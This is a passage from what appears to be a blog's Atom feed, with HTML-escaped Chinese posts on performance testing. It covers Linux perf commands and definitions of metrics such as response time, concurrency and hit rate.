User&#xFF1A;&#x7B80;&#x79F0;VU</p><p>&#x6807;&#x51C6;</p><blockquote><p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x662F;&#x5C06;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x5BB9;&#x91CF;&#x6D4B;&#x51FA;&#x6765;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6D4B;&#x8BD5;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#xFF0C;&#x9664;&#x4E86;&#x670D;&#x52A1;&#x5668;&#x957F;&#x8FDE;&#x63A5;&#x53EF;&#x80FD;&#x5F71;&#x54CD;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5916;&#xFF0C;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x4E0D;&#x53D7;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5F71;&#x54CD;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6700;&#x5C0F;&#x7684;&#x7528;&#x6237;&#x6570;&#x5C06;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x5BB9;&#x91CF;&#x6D4B;&#x8BD5;&#x51FA;&#x6765;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x66F4;&#x591A;&#x7684;&#x7528;&#x6237;&#x5C06;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x5BB9;&#x91CF;&#x6D4B;&#x8BD5;&#x51FA;&#x6765;&#x3002;</p></blockquote><p>3.4 &#x9519;&#x8BEF;&#x7387;<br>&#x5B9A;&#x4E49;&#x53CA;&#x89E3;&#x91CA;</p><blockquote><p>&#x539F;&#x6587;<a href="https://www.leoheng.com/2021/06/25/%E5%B8%B8%E7%94%A8%E6%80%A7%E8%83%BD%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://www.leoheng.com/2021/06/25/%E5%B8%B8%E7%94%A8%E6%80%A7%E8%83%BD%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;&amp;#x5E38;&amp;#x7528;&amp;#x6027;&amp;#x80FD;&amp;#x538B;&amp;#x6D4B;&amp;#x5DE5;&amp;#x5177;&amp;#x5B9E;&amp;#x6218;&amp;#x603B;&amp;#x7ED3;&quot;&gt;&lt;a href=&quot;#&amp;#x5E38;&amp;#x7528;&amp;#x6027;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux常用性能分析工具</title>
    <link href="https://marnm.github.io//posts/d53cba09/"/>
    <id>https://marnm.github.io//posts/d53cba09/</id>
    <published>2022-06-07T04:54:45.000Z</published>
    <updated>2022-06-07T04:56:53.593Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux性能管理工具</title>
    <link href="https://marnm.github.io//posts/480c215d/"/>
    <id>https://marnm.github.io//posts/480c215d/</id>
    <published>2022-06-07T04:54:32.000Z</published>
    <updated>2022-06-07T05:00:45.255Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x6027;&#x80FD;&#x6D4B;&#x8BD5;"><a href="#&#x6027;&#x80FD;&#x6D4B;&#x8BD5;" class="headerlink" title="&#x6027;&#x80FD;&#x6D4B;&#x8BD5;"></a>&#x6027;&#x80FD;&#x6D4B;&#x8BD5;</h2><h3 id="perf"><a href="#perf" class="headerlink" title="perf"></a>perf</h3><h4 id="&#x5E38;&#x7528;&#x7684;perf&#x547D;&#x4EE4;"><a href="#&#x5E38;&#x7528;&#x7684;perf&#x547D;&#x4EE4;" class="headerlink" title="&#x5E38;&#x7528;&#x7684;perf&#x547D;&#x4EE4;"></a>&#x5E38;&#x7528;&#x7684;perf&#x547D;&#x4EE4;</h4><ul><li>perf stat<br>  &#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x63D0;&#x4F9B;&#x5E38;&#x89C1;&#x7684;&#x6027;&#x80FD;&#x4E8B;&#x4EF6;&#x7EDF;&#x8BA1;&#x4FE1;&#x606F;&#xFF0C;&#x5305;&#x62EC;&#x8BF4;&#x660E;&#x6267;&#x884C;&#x548C;&#x6D88;&#x8017;&#x7684;&#x65F6;&#x949F;&#x5468;&#x671F;&#x3002;</li><li>perf record<br>  &#x8BE5;&#x547D;&#x4EE4;&#x80FD;&#x591F;&#x5C06;&#x6570;&#x636E;&#x8BB0;&#x5F55;&#x5E76;&#x751F;&#x6210;&#x4E00;&#x4E2A;perf.data&#x6587;&#x4EF6;</li><li>perf report<br>  &#x8BE5;&#x547D;&#x4EE4;&#x4ECE;perf record&#x751F;&#x6210;&#x7684;perf.data&#x6587;&#x4EF6;&#x4E2D;&#x8BFB;&#x53D6;&#x5E76;&#x663E;&#x793A;&#x4E8B;&#x4EF6;&#x6570;&#x636E;&#x3002;</li><li>perf list<br>  &#x5217;&#x51FA;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x53EF;&#x7528;&#x4E8B;&#x4EF6;</li><li><p>perf top<br>  &#x8BE5;&#x547D;&#x4EE4;&#x4E0E;<code>top</code>&#x547D;&#x4EE4;&#x7C7B;&#x4F3C;&#xFF0C;&#x5B9E;&#x65F6;&#x663E;&#x793A;&#x6027;&#x80FD;&#x4E8B;&#x4EF6;<br>  <img src="http://192.168.85.188:8081/uploads/165292411776693751202205072153614.png" alt=""></p></li><li><p>perf  trace<br>  &#x8BE5;&#x547D;&#x4EE4;&#x4E0E;<code>strace</code>&#x547D;&#x4EE4;&#x7C7B;&#x4F3C;&#xFF0C;&#x76D1;&#x89C6;&#x6307;&#x5B9A;&#x7EBF;&#x7A0B;&#x6216;&#x8FDB;&#x7A0B;&#x4F7F;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x4EE5;&#x53CA;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x63A5;&#x6536;&#x5230;&#x7684;&#x6240;&#x6709;&#x4FE1;&#x53F7;&#x3002;</p></li><li>perf help</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">perf list   <span class="comment"># &#x67E5;&#x770B;&#x5F53;&#x524D;&#x652F;&#x6301;&#x7684;&#x6240;&#x6709;&#x4E8B;&#x4EF6;</span></span><br><span class="line"><span class="comment"># [Software event]&#x8F6F;&#x4EF6;&#x4E8B;&#x4EF6;</span></span><br><span class="line"><span class="comment"># [Tool event]</span></span><br><span class="line"><span class="comment"># [Hardware cache event]  &#x786C;&#x4EF6;&#x7F13;&#x5B58;&#x4E8B;&#x4EF6;</span></span><br><span class="line"><span class="comment"># [Kernel PMU event] PMU&#x4E8B;&#x4EF6;</span></span><br><span class="line"><span class="comment"># [Hardware event]</span></span><br><span class="line"><span class="comment"># Tracepoint event</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><h2 id="&#x6027;&#x80FD;&#x4F18;&#x5316;"><a href="#&#x6027;&#x80FD;&#x4F18;&#x5316;" class="headerlink" title="&#x6027;&#x80FD;&#x4F18;&#x5316;"></a>&#x6027;&#x80FD;&#x4F18;&#x5316;</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x6027;&amp;#x80FD;&amp;#x6D4B;&amp;#x8BD5;&quot;&gt;&lt;a href=&quot;#&amp;#x6027;&amp;#x80FD;&amp;#x6D4B;&amp;#x8BD5;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x6027;&amp;#x80FD;&amp;#x6D4B;&amp;#x8
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>性能测试指标详解</title>
    <link href="https://marnm.github.io//posts/fa35a60d/"/>
    <id>https://marnm.github.io//posts/fa35a60d/</id>
    <published>2022-06-07T04:54:19.000Z</published>
    <updated>2022-06-07T05:01:02.229Z</updated>
    
    <content type="html"><![CDATA[<h1 id="&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x2014;&#x2014;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x5404;&#x6307;&#x6807;&#x8BF4;&#x660E;"><a href="#&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x2014;&#x2014;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x5404;&#x6307;&#x6807;&#x8BF4;&#x660E;" class="headerlink" title="&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x2014;&#x2014;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x5404;&#x6307;&#x6807;&#x8BF4;&#x660E;"></a>&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x2014;&#x2014;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x5404;&#x6307;&#x6807;&#x8BF4;&#x660E;</h1><p>&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;&#x662F;&#x8861;&#x91CF;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x7684;&#x8BC4;&#x4EF7;&#x6807;&#x51C6;&#xFF0C;&#x5E38;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;&#x5305;&#x62EC;&#xFF1A;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3001;&#x5E76;&#x53D1;&#x3001;&#x70B9;&#x51FB;&#x7387;&#x3001;&#x541E;&#x5410;&#x91CF;&#x3001;TPS/QPS&#x3001;PV/UV&#xFF1B;Linux&#x670D;&#x52A1;&#x5668;&#x5E38;&#x7528;&#x7684;&#x6027;&#x80FD;&#x6307;&#x6807;&#x5305;&#x62EC;&#xFF1A;CPU&#x4F7F;&#x7528;&#x7387;&#x3001;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;&#x3001;&#x78C1;&#x76D8;IO&#x3001;&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x7B49;&#x3002;</p><h2 id="&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;"><a href="#&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;" class="headerlink" title="&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;"></a>&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;</h2><h3 id="1-1-&#x54CD;&#x5E94;&#x65F6;&#x95F4;"><a href="#1-1-&#x54CD;&#x5E94;&#x65F6;&#x95F4;" class="headerlink" title="1.1 &#x54CD;&#x5E94;&#x65F6;&#x95F4;"></a>1.1 &#x54CD;&#x5E94;&#x65F6;&#x95F4;</h3><p>&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x662F;&#x6307;&#x67D0;&#x4E2A;&#x8BF7;&#x6C42;&#x6216;&#x64CD;&#x4F5C;&#x53D1;&#x51FA;&#x5230;&#x63A5;&#x6536;&#x5230;&#x53CD;&#x9988;&#x6240;&#x6D88;&#x8017;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x5305;&#x62EC;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x5BA2;&#x6237;&#x7AEF;&#xFF09;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x3001;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#x65F6;&#x95F4;&#x4EE5;&#x53CA;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x3002;&#x6BD4;&#x5982;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#x4ECE;&#x70B9;&#x51FB;/&#x8F93;&#x5165;&#x5230;&#x5B8C;&#x5168;&#x52A0;&#x8F7D;&#x7684;&#x65F6;&#x95F4;&#xFF1B;&#x5B8C;&#x6210;&#x4E00;&#x6B21;&#x589E;&#x52A0;&#x3001;&#x5220;&#x9664;&#x3001;&#x4FEE;&#x6539;&#x6216;&#x8005;&#x67E5;&#x8BE2;&#x52A8;&#x4F5C;&#x7684;&#x4E8B;&#x52A1;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x7B49;&#x3002;</p><p>&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x5728;&#x7F51;&#x7EDC;&#x4E0A;&#x7684;&#x4F20;&#x8F93;&#x5F80;&#x5F80;&#x8981;&#x7ECF;&#x5386;&#x591A;&#x4E2A;&#x7F51;&#x7EDC;&#x8282;&#x70B9;&#x624D;&#x80FD;&#x5230;&#x8FBE;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6211;&#x4EEC;&#x5047;&#x8BBE;&#x8BF7;&#x6C42;&#x7ECF;&#x5386;&#x4E86;&#x4E09;&#x4E2A;&#x7F51;&#x7EDC;&#x8282;&#x70B9;&#x7684;&#x4F20;&#x8F93;&#x65F6;&#x95F4;B1&#x3001;B2&#x3001;B3&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x4E3A;A&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x7684;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x4E3A;C&#x3002;&#x5219;&#x4E00;&#x6B21;&#x8BF7;&#x6C42;&#x7684;&#x5B8C;&#x6574;&#x8DEF;&#x5F84;&#x53EF;&#x4EE5;&#x63CF;&#x8FF0;&#x4E3A;&#x4E0B;&#x56FE;&#xFF1A;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://192.168.84.188:8081/uploads/16529237626752468130515.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>&#x5BA2;&#x6237;&#x7AEF;&#x4ECE;&#x53D1;&#x51FA;&#x8BF7;&#x6C42;&#x5230;&#x63A5;&#x6536;&#x5230;&#x670D;&#x52A1;&#x5668;&#x53CD;&#x9988;&#x7684;&#x5B8C;&#x6574;&#x94FE;&#x8DEF;&#x65F6;&#x95F4;&#x4E3A;A&#x2014;&gt;B1&#x2014;&gt;B2&#x2014;&gt;B3&#x2014;&gt;C&#xFF08;&#x8282;&#x70B9;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x90FD;&#x5305;&#x62EC;&#x63A5;&#x6536;&#x548C;&#x53D1;&#x9001;&#x4E24;&#x4E2A;&#x8FC7;&#x7A0B;&#xFF09;&#x3002;&#x5219;&#x8BF7;&#x6C42;&#x7684;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x4E3A;&#xFF1A;</p><p>&#x54CD;&#x5E94;&#x65F6;&#x95F4;=A+B1+B2+B3+C</p><h3 id="1-2-&#x5E76;&#x53D1;"><a href="#1-2-&#x5E76;&#x53D1;" class="headerlink" title="1.2 &#x5E76;&#x53D1;"></a>1.2 &#x5E76;&#x53D1;</h3><p>&#x5E76;&#x53D1;&#x662F;&#x6307;&#x591A;&#x4E2A;&#x7528;&#x6237;&#x5728;&#x540C;&#x4E00;&#x65F6;&#x671F;&#x5185;&#x8FDB;&#x884C;&#x76F8;&#x540C;&#x7684;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x6216;&#x64CD;&#x4F5C;&#x3002;&#x7531;&#x4E8E;&#x7528;&#x6237;&#x5728;&#x8FDB;&#x884C;&#x4E00;&#x7CFB;&#x5217;&#x64CD;&#x4F5C;&#x6D41;&#x7A0B;&#x65F6;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF08;&#x5373;&#x7528;&#x6237;&#x601D;&#x8003;&#x65F6;&#x95F4;&#xFF09;&#x6216;&#x8005;&#x670D;&#x52A1;&#x5668;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x6709;&#x5148;&#x540E;&#x987A;&#x5E8F;&#xFF0C;&#x4E8E;&#x662F;&#xFF0C;&#x5C31;&#x4EA7;&#x751F;&#x4E86;&#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x548C;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#x6982;&#x5FF5;&#x7684;&#x533A;&#x5206;&#x3002;</p><p>&#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x662F;&#x6307;&#x540C;&#x4E00;&#x65F6;&#x523B;&#xFF08;&#x5373;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x70B9;&#xFF09;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x540C;&#x65F6;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x3002;</p><p>&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#x662F;&#x6307;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#xFF08;&#x5373;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x533A;&#x95F4;&#xFF09;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x3002;</p><p>&#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x4E00;&#x4E2A;&#x5E76;&#x53D1;&#x91CF;&#x4E3A;10000&#x4EBA;&#xFF08;&#x53EF;&#x540C;&#x65F6;&#x5BB9;&#x7EB3;10000&#x4EBA;&#xFF09;&#x7684;&#x52A8;&#x7269;&#x56ED;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;&#x5E76;&#x53D1;&#x91CF;&#x662F;&#x6307;&#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x8FD8;&#x662F;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x5F88;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#xFF0C;&#x8FD9;&#x4E2A;&#x5E76;&#x53D1;&#x6307;&#x7684;&#x662F;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#xFF0C;&#x56E0;&#x4E3A;&#x6574;&#x4E2A;&#x52A8;&#x7269;&#x56ED;&#x662F;&#x4E00;&#x4E2A;&#x4EA4;&#x7EC7;&#x7684;&#x7F51;&#x72B6;&#x7ED3;&#x6784;&#xFF0C;&#x51FA;&#x5165;&#x53E3;&#x3001;&#x8001;&#x864E;&#x3001;&#x72EE;&#x5B50;&#x3001;&#x5927;&#x8C61;&#x7B49;&#x5404;&#x4E2A;&#x52A8;&#x7269;&#x7AD9;&#x70B9;&#x90FD;&#x6709;&#x5206;&#x6D41;&#x7684;&#x4F5C;&#x7528;&#xFF0C;&#x57FA;&#x672C;&#x4E0D;&#x53EF;&#x80FD;&#x51FA;&#x73B0;&#x51FA;&#x5165;&#x53E3;&#x6216;&#x8005;&#x7AD9;&#x70B9;&#x80FD;&#x591F;&#x540C;&#x65F6;&#x627F;&#x8F7D;10000&#x4EBA;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x51FA;&#x5165;&#x53E3;&#x7684;&#x5E76;&#x53D1;&#x53EF;&#x80FD;&#x53EA;&#x6709;200&#x4EBA;&#x3002;&#x56E0;&#x6B64;&#x8FD9;&#x4E2A;&#x52A8;&#x7269;&#x56ED;&#x7684;&#x4F8B;&#x5B50;&#x91CC;&#xFF0C;&#x5E76;&#x53D1;&#x91CF;10000&#x662F;&#x6307;&#x5404;&#x4E2A;&#x8282;&#x70B9;&#x7684;&#x603B;&#x548C;&#xFF0C;&#x53C2;&#x89C2;&#x8005;&#x53C2;&#x89C2;&#x52A8;&#x7269;&#x56ED;&#x6709;&#x8DEF;&#x5F84;&#x7684;&#x5148;&#x540E;&#x987A;&#x5E8F;&#xFF0C;&#x662F;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#x7684;&#x6982;&#x5FF5;&#x3002;&#x800C;&#x51FA;&#x5165;&#x53E3;&#x7684;&#x5E76;&#x53D1;&#x91CF;&#x662F;200&#x4EBA;&#xFF0C;&#x5219;&#x662F;&#x6307;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x5728;&#x51FA;&#x5165;&#x53E3;&#x80FD;&#x591F;&#x540C;&#x65F6;&#x5BB9;&#x7EB3;200&#x4EBA;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;&#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x7684;&#x6982;&#x5FF5;&#x3002;</p><p>&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x5728;&#x7CFB;&#x7EDF;&#x7684;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x6A21;&#x5757;&#x7684;&#x5E76;&#x53D1;&#x66F4;&#x591A;&#x662F;&#x6307;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#xFF0C;&#x800C;&#x63A5;&#x53E3;&#x7684;&#x5E76;&#x53D1;&#x66F4;&#x503E;&#x5411;&#x4E8E;&#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x3002;&#x5E76;&#x53D1;&#x6027;&#x80FD;&#x7684;&#x6982;&#x5FF5;&#x662F;&#x6307;&#x7CFB;&#x7EDF;&#x3001;&#x6A21;&#x5757;&#x6216;&#x63A5;&#x53E3;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#xFF0C;&#x4E0D;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x6240;&#x80FD;&#x591F;&#x627F;&#x8F7D;&#x7684;&#x5E76;&#x53D1;&#x91CF;&#x3002;</p><p>&#x5728;&#x5E76;&#x53D1;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#x5E38;&#x7528;&#x5230;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x548C;&#x5E76;&#x53D1;&#x8BF7;&#x6C42;&#x6570;&#x4E24;&#x4E2A;&#x6307;&#x6807;&#x3002;&#x987E;&#x540D;&#x601D;&#x4E49;&#xFF0C;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x662F;&#x6307;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#xFF08;&#x70B9;&#x6216;&#x533A;&#x95F4;&#xFF09;&#xFF0C;&#x7CFB;&#x7EDF;&#x3001;&#x6A21;&#x5757;&#x6216;&#x63A5;&#x53E3;&#x80FD;&#x591F;&#x627F;&#x8F7D;&#x7684;&#x7528;&#x6237;&#x6570;&#x91CF;&#xFF1B;&#x5E76;&#x53D1;&#x8BF7;&#x6C42;&#x6570;&#x662F;&#x6307;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#xFF08;&#x70B9;&#x6216;&#x533A;&#x95F4;&#xFF09;&#xFF0C;&#x7CFB;&#x7EDF;&#x3001;&#x6A21;&#x5757;&#x6216;&#x63A5;&#x53E3;&#x80FD;&#x591F;&#x627F;&#x8F7D;&#x7684;&#x8BF7;&#x6C42;&#x6570;&#x91CF;&#x3002;</p><h3 id="1-3-&#x70B9;&#x51FB;&#x91CF;-&#x70B9;&#x51FB;&#x7387;"><a href="#1-3-&#x70B9;&#x51FB;&#x91CF;-&#x70B9;&#x51FB;&#x7387;" class="headerlink" title="1.3 &#x70B9;&#x51FB;&#x91CF;/&#x70B9;&#x51FB;&#x7387;"></a>1.3 &#x70B9;&#x51FB;&#x91CF;/&#x70B9;&#x51FB;&#x7387;</h3><p>&#x70B9;&#x51FB;&#x91CF;&#x662F;&#x8861;&#x91CF;&#x7F51;&#x7AD9;&#x6D41;&#x91CF;&#x7684;&#x4E00;&#x4E2A;&#x6307;&#x6807;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x70B9;&#x51FB;&#x6570;clicks&#xFF0C;&#x662F;&#x5BF9;&#x7F51;&#x7AD9;&#x70B9;&#x51FB;&#x6570;&#x636E;&#x7684;&#x7EDF;&#x8BA1;&#x3002;</p><p>&#x70B9;&#x51FB;&#x7387;&#xFF08;Clicks Ratio&#xFF09;&#x4E5F;&#x53EF;&#x4EE5;&#x53EB;&#x505A;&#x70B9;&#x8FDB;&#x7387;&#xFF08;&#x201C;Click-through Rate&#xFF09;&#xFF0C;&#x5B83;&#x662F;&#x7F51;&#x7AD9;&#x4E0A;&#x67D0;&#x4E00;&#x5185;&#x5BB9;&#x88AB;&#x70B9;&#x51FB;&#x7684;&#x6B21;&#x6570;&#x4E0E;&#x6574;&#x4E2A;&#x7F51;&#x7AD9;&#x5185;&#x5BB9;&#x88AB;&#x663E;&#x793A;&#x6B21;&#x6570;&#x4E4B;&#x6BD4;&#xFF0C;&#x5373;clicks/views&#x3002;&#x53CD;&#x5E94;&#x4E86;&#x7F51;&#x7AD9;&#x4E0A;&#x67D0;&#x4E00;&#x9875;&#x9762;&#x6216;&#x5185;&#x5BB9;&#x7684;&#x53D7;&#x5173;&#x6CE8;&#x7A0B;&#x5EA6;&#xFF0C;&#x7ECF;&#x5E38;&#x7528;&#x6765;&#x8861;&#x91CF;&#x5E7F;&#x544A;&#x7684;&#x5438;&#x5F15;&#x7A0B;&#x5EA6;&#x3002;&#x6BD4;&#x5982;&#x516C;&#x4F17;&#x53F7;&#x7684;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x88AB;&#x6D4F;&#x89C8;&#x4E86;10w&#x6B21;&#xFF0C;&#x6587;&#x7AE0;&#x4E2D;&#x7684;&#x5E7F;&#x544A;&#x94FE;&#x63A5;&#x88AB;&#x70B9;&#x51FB;&#x4E86;2000&#x6B21;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x6761;&#x5E7F;&#x544A;&#x7684;&#x70B9;&#x51FB;&#x7387;&#x662F;2%&#xFF08;2000/100000*100%&#xFF09;&#x3002;</p><p>&#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x9886;&#x57DF;&#xFF0C;&#x70B9;&#x51FB;&#x7387;&#xFF08;hit rate&#xFF09;&#x5E38;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#xFF08;&#x6BCF;&#x79D2;&#x949F;&#xFF09;&#x9875;&#x9762;&#x7684;&#x70B9;&#x51FB;&#x6570;&#xFF0C;&#x5373;&#x6BCF;&#x79D2;&#x949F;&#x53D1;&#x9001;&#x7684;http&#x8BF7;&#x6C42;&#x6570;&#x91CF;&#xFF0C;&#x70B9;&#x51FB;&#x7387;&#x8D8A;&#x5927;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x9020;&#x6210;&#x7684;&#x538B;&#x529B;&#x4E5F;&#x8D8A;&#x5927;&#xFF0C;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x7684;&#x6027;&#x80FD;&#x8981;&#x6C42;&#x4E5F;&#x8D8A;&#x9AD8;&#x3002;</p><p>&#x6709;&#x4E9B;&#x4EBA;&#x5BB9;&#x6613;&#x6DF7;&#x6DC6;&#x70B9;&#x51FB;&#x7387;&#x548C;&#x70B9;&#x51FB;&#x91CF;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x6BD4;&#x5982;&#x6211;&#x4EEC;&#x7ECF;&#x5E38;&#x4F1A;&#x542C;&#x5230;&#x6709;&#x4EBA;&#x8BF4;&#x67D0;&#x7F51;&#x7AD9;&#x7684;&#x70B9;&#x51FB;&#x7387;&#x662F;&#x591A;&#x591A;&#x4E07;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x8FD9;&#x91CC;&#x7684;&#x70B9;&#x51FB;&#x7387;&#x6307;&#x7684;&#x662F;&#x70B9;&#x51FB;&#x91CF;&#xFF0C;&#x66DD;&#x5149;&#x7387;&#x6216;&#x8005;&#x8BF4;&#x9875;&#x9762;&#x6D4F;&#x89C8;&#x91CF;&#x3002;</p><h3 id="1-4-&#x541E;&#x5410;&#x91CF;-&#x541E;&#x5410;&#x7387;"><a 